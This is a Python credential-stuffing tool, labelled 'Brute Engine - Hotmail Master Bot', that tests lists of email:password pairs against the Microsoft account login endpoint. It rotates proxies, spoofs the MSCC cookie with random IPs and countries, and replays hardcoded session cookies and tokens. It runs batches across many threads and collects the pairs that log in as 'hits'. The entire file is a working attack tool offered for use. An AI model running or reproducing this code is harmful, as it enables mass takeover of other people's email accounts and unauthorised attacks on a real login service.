#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Brute Engine - Hotmail Master Bot
FAST VALIDATION using working API from @torbaapchudirvai's script.
Returns: 'HIT', '2FA', 'BAD', or 'ERROR'
"""

import os
import re
import time
import uuid
import random
import logging
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Callable

logger = logging.getLogger(__name__)


# ==================== CONSTANTS & HELPERS ====================

MARCO_COUNTRIES = [
    "US", "BG", "FR", "DE", "IT", "ES", "RU", "CN", "JP", "BR",
    "IN", "CA", "GB", "AU", "NL", "SE", "NO", "DK", "FI", "PL",
    "MX", "KR", "ZA", "AR", "BE", "CH", "AT", "IE", "PT", "GR",
    "CZ", "HU", "RO", "SK", "HR", "SI", "LT", "LV", "EE", "IS",
]

def marco_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def marco_bypass_mscc():
    ip = marco_ip()
    country = random.choice(MARCO_COUNTRIES)
    return f"{ip}-{country}"

# Base parameters and cookies (same as working script)
BASE_PARAMS = {
    'cobrandid': 'ab0455a0-8d03-46b9-b18b-df2f57b9e44c',
    'id': '292841',
    'contextid': '3F4165B453B5320C',
    'opid': '321E49E08810F944',
    'bk': '1734351835',
    'uaid': '58d0ccd482b043f4ad9ad325922d098d',
    'pid': '0',
}

BASE_COOKIES = {
    'MicrosoftApplicationsTelemetryDeviceId': '14a9a8ff-3636-4825-a703-0db38efdcd20',
    'MUID': 'c34ce51b7cdd443a93a3657f33f4c36e',
    'MSFPC': 'GUID=b98c9790e1cf4622a61d1b29d0ea33bf&HASH=b98c&LV=202411&V=4&LU=1732802817199',
    'MSPBack': '0',
    'logonLatency': 'LGN01=638699485608669665',
    'IgnoreCAW': '1',
    '__Host-MSAAUTH': '11',
    '__Host-MSAAUTHP': '11',
    'uaid': '58d0ccd482b043f4ad9ad325922d098d',
    'MSPRequ': 'id=292841&lt=1734351803&co=0',
    'MSPOK': '$uuid-50b6d9bc-ba8a-40b7-85a3-339a9677f921$uuid-397b34be-88db-4fb9-8cc8-c68d7c38f846$uuid-bea52c50-f41f-4c37-ac16-d048308a276a$uuid-25d89ac5-def3-49c7-bb85-865ebafcc03d$uuid-1ada363d-3005-4dbe-b118-670fa0db81ef$uuid-c9c2443e-5eba-4ac0-ae89-23ca35144f6c$uuid-fa304755-fa4c-4afe-b225-e2e2d842d501$uuid-26b938bf-1302-4b11-bde4-6e194c026275',
    'OParams': '11O.DuxxJk6UKaGbhEk4gp1eIgLwuyrAwt7!ErW1kzspY76ZOE0KBvZw2sDa1Olrd!HwnV0m0JKdogZwWlTUXvPhf5aTc4Y2WRZZHScgBNbc4tq5PawQ4Oa1wflb!ly!E82zGEYkDGXV1wV6umpjVKIyFRrnm6o9wdBkuBUwBpSX6GtnTwzhr2ACgQndE6PyOZ2Xnieaurf7wAPAgJQrNk3nZUrBNOwtxph9fLqsGsuCHDLMvZi4nceRrOhBoA4uccgfzOzH1k7VELkiCiu328aJDSy2BRKrmWMyJ7qcfpgv1o9Wxe8NUFLEq64j2Rz*1Jj8mNvoPWd6YZjEzl5msChRYd28yKBweimC*bFr93jjEpqyLqWdLwgLVwSJTNjIXZEWx3rJePB4p1XIz5uyw36tf6447tm*4EeXjj2R9MDH7AHbk98jNOVoy9I74V4qAglMfm2476JC6BPGTG5guWDmRqkgeAuRq4OaFzXd2p1OyQJxJdrbDBIn1q0O4d1Z9fgvhPL5ZawCBuW1eNbaf2ioLYlGXslRfxZuklxNl6fb9La6yVu1YtjEscY0yS1aUu4o3c7CUzqS5MWKRi*GuglUFAcIqnxfBmwo6tDg6MMNF1Qg6AcQDUIbjFJ7h*E8qwnRSWRcoZnrLl4GDq1bIEViQs4VczH50YrzyC!B*zzmgX9EwA549W9aNQZAr5*0Wb9fd4n7Et7WllStd4dr93sOWqYqNsvF4pPwiGyvSBJ3EM1s3S9*rcCevs3teFjKLxi4BvqWcuiNe3iUtBi5iZMTgrYSfvf4hodEsisUD!V9ASdWB1bICKTjwcSvHS1N2WE6icFybbxaKkFb!xRnLLimdZ1eecBNVS77BMkCi9K9YVMXBQqR*uHR9vwrAiMjOMiCIlMPUjpcrFE8!ZNjyyn2RHdknkZ5JrksG7q8mgAvracjYgFRWfCcIhgnbFEKL!ZYRxRaNDd0Hprw0WhpUC8nbv2jhDFOO6cNrTtH3K64xPwjuMVdrJWFrgs7N1xq5N95WCFqHBLK6DZbEaEO7J7tR7kdFjyenXaKII2PtBphmjP5hV5ktbbyWz5Nw2A5wj*R1IknP8MJdgxJnCIgxq7stVmeYDwj7UI353Fur32gX9U9agOiwS9NSjbhzzL392vPjmUHo3LTdDg7dDY5Niyd7DdM7u0lChRneT38GGvG5!5kZVRq*y6zUCiByMFsVYPo9XMtWxVw9VdTPNWGmyvroAjY7rUjM9BaUrpEOlrxFp7MWivJpb5vQdHgDEZuMz6z!urAsDu6kNfGC1dCK0RTsK5Oofe0LX08I3aG*6Bpmd2nJo2c2hv6yml5l2pUz46lS1YZDvX8xSRvNRW8TyFLZItOLe1zyuohzqJFg7a2bWQ3BiJY3TNwGgEMAkJBmDYvojmNzi42f5aCn99Ib4JRgjDimn5!iOLJFG4A*2TxEI6uX3uEkMTWdG4bBu!LK!tnQd27TQWttmRVkiS3MrFwVvbpRZxYNAz0y6KnCb0kHB5yxNo2K7EHK7!27elxN6kXI5AgToTRxbyfMKsZ4APsvyep0DxDYGfOTHN5exQJ79VLjHLqFkUh5s3gnOsrHd9odKKWVLOyLtryQpw7WWeGb*35hw0h7PJJBLV4yQdCDPu*pQUKG05LRHD3seaUhE7nMY7wfgwBqHw!szw*MojEdn2*wpUQEuSWBMOLdhg7e!IEi95VnQmt1vFs3zqbouf2l1vYPQQ7zs9rq!VnSB3ssfn3rPKXLHtYx*1DE3z4LlP1rJfS9l*TtDEXv25QeA2*4HC3vyGhGwrsgbgcoHs8aRMyXI6yotM3idT0XGinDhm3FkJw3ivT3ucW3*TaM7lL9FJpeYHGiHQkNo1pl!1p2*BzDcmgLeRNA*pGXKxYy1VwbKYlnt5HcPT5MMVt7JLIQAoQOELM6vEWx2COrd1DroDRLlABf9CUQbsgKTjndSUdlGgmXN9liDHAVyisTPVF1cKQwGNewFjVv85AWuum0C77vWhOVbeMXY4eCQWXw8Qnstk98cSJFMSk5BwYCnZAfdGOechxU70Cwe1X0BYnpZwF7462wMiRlCISYq8Iljl*',
    'ai_session': 'KxadqVzH/SW/WdJJgrm1rq|1734351763006|1734351835954',
}


class BruteProxyManager:
    """Proxy manager for brute validation"""
    def __init__(self, proxy_file=None):
        self.proxies = []
        self.lock = threading.Lock()
        if proxy_file and os.path.exists(proxy_file):
            self.load_proxies(proxy_file)

    def load_proxies(self, filepath):
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            for line in lines:
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) == 2:
                        proxy = {
                            'http': f'http://{parts[0]}:{parts[1]}',
                            'https': f'http://{parts[0]}:{parts[1]}'
                        }
                        self.proxies.append(proxy)
                    elif len(parts) == 4:
                        proxy = {
                            'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                            'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                        }
                        self.proxies.append(proxy)
        except Exception as e:
            logger.error(f"Error loading proxies: {e}")

    def get_random_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

    def has_proxies(self):
        return len(self.proxies) > 0


class BruteValidator:
    """
    Fast validator using the working API from @torbaapchudirvai's script.
    Returns: 'HIT', '2FA', 'BAD', or 'ERROR'
    """
    def __init__(self, proxy_manager=None, timeout=30):
        self.proxy_manager = proxy_manager
        self.timeout = timeout

    def _get_session(self):
        session = requests.Session()
        if self.proxy_manager and self.proxy_manager.has_proxies():
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                session.proxies.update(proxy)
        return session

    def validate(self, email, password):
        """
        Validate credentials using the exact flow from the working script.
        """
        session = None
        try:
            session = self._get_session()

            # Prepare cookies (add dynamic MSCC)
            cookies = BASE_COOKIES.copy()
            cookies['MSCC'] = marco_bypass_mscc()

            # Headers (simulate browser)
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-US,en;q=0.9,ckb-IQ;q=0.8,ckb;q=0.7',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://login.live.com',
                'Referer': 'https://login.live.com/ppsecure/post.srf',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.54 Mobile Safari/537.36',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            }

            # Prepare data (PPFT is fixed in the script, but might need to be dynamic? The script uses a hardcoded PPFT.
            # To be safe, we could fetch it from the login page, but the script works with hardcoded PPFT.
            # We'll use the same hardcoded PPFT as the script.
            data = {
                'ps': '2',
                'psRNGCDefaultType': '',
                'psRNGCEntropy': '',
                'psRNGCSLK': '',
                'canary': '',
                'ctx': '',
                'hpgrequestid': '',
                'PPFT': '-DrkkvkRmlrT4TgoimVFNP2UJeQXbiW7NUs!bL6YbSVlVrQ4MCuuy4QdgPI!d4DErNMJ7DiW4biqbufTFkFHd9L*WqaHeUy5LH09OGipZWR5aJPlH8297FxbdvN9VVCU2Pt1eev6vEz5zEFlj0UepV0BjPns4!oaSu7iYNUxZgVnzsdi7HGelIoVZpkh0v6FhDD3ieSTAUTsEuWqn46mXYCl1Qhmr4W1j0w8Vg!AVxVPF',
                'PPSX': 'Passp',
                'NewUser': '1',
                'FoundMSAs': '',
                'fspost': '0',
                'i21': '0',
                'CookieDisclosure': '0',
                'IsFidoSupported': '1',
                'isSignupPost': '0',
                'isRecoveryAttemptPost': '0',
                'i13': '0',
                'login': email,
                'loginfmt': email,
                'type': '11',
                'LoginOptions': '3',
                'lrt': '',
                'lrtPartition': '',
                'hisRegion': '',
                'hisScaleUnit': '',
                'passwd': password
            }

            # Make the request
            response = session.post(
                'https://login.live.com/ppsecure/post.srf',
                params=BASE_PARAMS,
                cookies=cookies,
                headers=headers,
                data=data,
                timeout=self.timeout
            )
            response_text = response.text

            # Determine result based on the script's logic
            # First check for HIT (successful login)
            if any(x in response_text for x in [
                "SigninName",
                "Add?mkt",
                'name="ANON"',
                "WLSSC",
            ]) or "__Host-MSAAUTH" in response.cookies:
                return "HIT"

            # Check for 2FA / locked / bad
            # The script's fail conditions:
            if any(x in response_text for x in [
                "https://account.live.com/recover?mkt",
                "recover",
                "Abuse?mkt",
                "identity?mkt",
                "cancel?mkt=",
                "confirm?mkt",
                "CW:true",
                "Confirm?mkt",
                "Confirm/",
                "We're unable to complete your request",
                "Your account has been lock"
            ]):
                return "BAD"

            if any(x in response_text for x in [
                "incorrect",
                "account or password is incorrect",
                "t exist",
                "doesn't exist",
                "Reopen account?",
                "trying to sign in to an account that's going to be closed on"
            ]):
                return "BAD"

            # If none of the above, it's unknown/error
            return "ERROR"

        except requests.exceptions.ProxyError:
            return "ERROR"
        except requests.exceptions.Timeout:
            return "ERROR"
        except requests.exceptions.ConnectionError:
            return "ERROR"
        except Exception as e:
            logger.debug(f"Validation error for {email}: {e}")
            return "ERROR"
        finally:
            if session:
                session.close()


class BruteEngine:
    """
    High-speed brute force engine using the working validator.
    """
    def __init__(self, proxy_file=None, timeout=30):
        self.proxy_manager = BruteProxyManager(proxy_file)
        self.timeout = timeout

    def validate_single(self, email, password):
        """Validate a single account."""
        try:
            validator = BruteValidator(self.proxy_manager, timeout=self.timeout)
            result = validator.validate(email, password)
            logger.info(f"Validated {email}: {result}")
            return result
        except Exception as e:
            logger.error(f"Validation error for {email}: {e}")
            return "ERROR"

    def validate_batch(self, combos, threads=50, include_2fa=True, progress_callback=None):
        """
        Validate a batch of accounts.

        Args:
            combos: list of "email:password" strings
            threads: number of concurrent threads
            include_2fa: whether to include 2FA accounts in results (not used, as we don't detect 2FA separately)
            progress_callback: callback function(checked) called every 10 checks

        Returns:
            dict: {
                'hits': List[str],
                '2fa': List[str],   # always empty (not detected)
                'bad': int,
                'errors': int,
                'checked': int
            }
        """
        results = {
            'hits': [],
            '2fa': [],
            'bad': 0,
            'errors': 0,
            'checked': 0
        }
        lock = threading.Lock()

        def worker(combo):
            try:
                email, pwd = combo.split(':', 1)
                email = email.strip()
                pwd = pwd.strip()

                validator = BruteValidator(self.proxy_manager, timeout=self.timeout)
                status = validator.validate(email, pwd)

                with lock:
                    results['checked'] += 1
                    if status == "HIT":
                        results['hits'].append(f"{email}:{pwd}")
                    elif status == "BAD":
                        results['bad'] += 1
                    else:
                        results['errors'] += 1

                    if progress_callback and results['checked'] % 10 == 0:
                        progress_callback(results['checked'])
            except Exception as e:
                logger.debug(f"Worker error: {e}")
                with lock:
                    results['errors'] += 1
                    results['checked'] += 1

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, combo) for combo in combos]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Future error: {e}")

        return results